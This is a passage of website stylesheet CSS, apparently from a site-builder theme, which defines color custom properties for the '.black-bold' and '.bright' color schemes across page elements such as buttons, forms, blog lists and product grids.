on-background:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-title-color:hsla(var(--white-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--white-hsl),1);--tweak-video-item-meta-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-video-item-title-color:hsla(var(--white-hsl),1);--video-grid-basic-description-color:hsla(var(--white-hsl),1);--video-grid-basic-meta-color:hsla(var(--white-hsl),1);--video-grid-basic-title-color:hsla(var(--white-hsl),1);--video-grid-category-nav-color:hsla(var(--white-hsl),1);}.black-bold {--announcement-bar-background-color:hsla(var(--accent-hsl),1);--announcement-bar-text-color:hsla(var(--safeInverseAccent-hsl),1);--backgroundOverlayColor:hsla(var(--black-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--black-hsl),1);--course-item-nav-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-border-color:hsla(var(--white-hsl),0.25);--course-item-nav-text-color:hsla(var(--white-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.95);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--accent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--safeLightAccent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.95);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--safeLightAccent-hsl),1);--headingLargeColor:hsla(var(--safeLightAccent-hsl),1);--headingLinkColor:hsla(var(--safeLightAccent-hsl),1);--headingMediumColor:hsla(var(--safeLightAccent-hsl),1);--headingSmallColor:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-card-image-title-color:hsla(var(--white-hsl),1);--image-block-card-inline-link-color:hsla(var(--white-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-collage-image-title-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-color:hsla(var(--white-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--white-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--black-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-stack-image-title-color:hsla(var(--white-hsl),1);--image-block-stack-inline-link-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-description-color:hsla(var(--white-hsl),1);--list-section-carousel-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-description-color:hsla(var(--white-hsl),1);--list-section-simple-title-color:hsla(var(--safeLightAccent-hsl),1);--list-section-title-color:hsla(var(--safeLightAccent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--black-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--safeLightAccent-hsl),1);--navigationLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphLargeColor:hsla(var(--white-hsl),1);--paragraphLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphMediumColor:hsla(var(--white-hsl),1);--paragraphSmallColor:hsla(var(--white-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--black-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--white-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--safeLightAccent-hsl),1);--portfolio-index-background-title-color:hsla(var(--white-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeLightAccent-hsl),1);--section-inset-border-color:hsla(var(--black-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--siteBackgroundColor:hsla(var(--black-hsl),1);--siteTitleColor:hsla(var(--safeLightAccent-hsl),1);--social-links-block-main-icon-color:hsla(var(--white-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--black-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--white-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--text-highlight-color:hsla(var(--safeLightAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--white-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--white-hsl),1);--tweak-blog-item-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--white-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-description-color:hsla(var(--white-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-option-color:hsla(var(--white-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--white-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-title-color:hsla(var(--white-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--darkAccent-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--darkAccent-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--white-hsl),1);--tweak-form-block-field-border-color-hsl:var(--white-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--white-hsl),1);--tweak-form-block-field-input-color:hsla(var(--white-hsl),1);--tweak-form-block-field-input-color-hsl:var(--white-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-gallery-icon-background-color:hsla(var(--black-hsl),1);--tweak-gallery-icon-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--white-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-line-block-line-color:hsla(var(--safeLightAccent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--white-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--white-hsl),1);--tweak-menu-block-nav-color:hsla(var(--safeLightAccent-hsl),1);--tweak-menu-block-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-quote-block-text-color:hsla(var(--white-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--white-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--white-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-title-color:hsla(var(--white-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--accent-hsl),1);--tweak-video-item-meta-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-video-item-title-color:hsla(var(--accent-hsl),1);--video-grid-basic-description-color:hsla(var(--accent-hsl),1);--video-grid-basic-meta-color:hsla(var(--accent-hsl),1);--video-grid-basic-title-color:hsla(var(--accent-hsl),1);--video-grid-category-nav-color:hsla(var(--accent-hsl),1);}.bright {--announcement-bar-background-color:hsla(var(--safeInverseAccent-hsl),1);--announcement-bar-text-color:hsla(var(--accent-hsl),1);--backgroundOverlayColor:hsla(var(--accent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--black-hsl),1);--course-item-nav-background-color:hsla(var(--black-hsl),1);--course-item-nav-border-color:hsla(var(--white-hsl),0.25);--course-item-nav-text-color:hsla(var(--white-hsl),1);--course-list-course-progress-bar-color:hsla(var(--darkAccent-hsl),1);--course-list-course-item-background:hsla(var(--black-hsl),1);--course-list-course-item-hover-background:hsla(var(--black-hsl),0.9);--course-list-course-item-text-color:hsla(var(--lightAccent-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--darkAccent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--safeInverseAccent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--black-hsl),0.9);--course-list-grid-layout-course-item-text-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--darkAccent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--safeInverseAccent-hsl),1);--headingLargeColor:hsla(var(--safeInverseAccent-hsl),1);--headingLinkColor:hsla(var(--safeInverseAccent-hsl),1);--headingMediumColor:hsla(var(--safeInverseAccent-hsl),1);--headingSmallColor:hsla(var(--safeInverseAccent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--accent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--accent-hsl),0);--image-block-card-image-title-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-card-inline-link-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-background-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--accent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--accent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--accent-hsl),0);--image-block-collage-image-title-color:hsla(var(--accent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--accent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--accent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--accent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--accent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--accent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--accent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--accent-hsl),0);--image-block-stack-image-title-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-stack-inline-link-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--white-hsl),0);--list-section-banner-slideshow-arrow-color:hsla(var(--accent-hsl),0);--list-section-banner-slideshow-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--accent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-description-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--accent-hsl),1);--list-section-carousel-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--accent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--accent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-description-color:hsla(var(--accent-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--accent-hsl),1);--list-section-simple-card-title-color:hsla(var(--accent-hsl),1);--list-section-simple-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-title-color:hsla(var(--safeInverseAccent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--accent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--accent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--safeInverseAccent-hsl),1);--navigationLinkColor:hsla(var(--safeInverseAccent-hsl),1);--paragraphLargeColor:hsla(var(--safeInverseAccent-hsl),1);--paragraphLinkColor:hsla(var(--safeInverseAccent-hsl),1);--paragraphMediumColor:hsla(var(--safeInverseAccent-hsl),1);--paragraphSmallColor:hsla(var(--safeInverseAccent-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--safeInverseAccent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--accent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--safeInverseAccent-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--safeInverseAccent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--safeInverseAccent-hsl),1);--portfolio-index-background-title-color:hsla(var(--safeInverseAccent-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--primaryButtonTextColor:hsla(var(--accent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--accent-hsl),1);--section-divider-stroke-color:hsla(var(--safeInverseAccent-hsl),1);--section-inset-border-color:hsla(var(--accent-hsl),1);--shape-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--shape-block-dropshadow-color:hsla(var(--safeInverseAccent-hsl),1);--shape-block-stroke-color:hsla(var(--black-hsl),1);--siteBackgroundColor:hsla(var(--accent-hsl),1);--siteTitleColor:hsla(var(--safeInverseAccent-hsl),1);--social-links-block-main-icon-color:hsla(var(--safeInverseAccent-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--accent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summa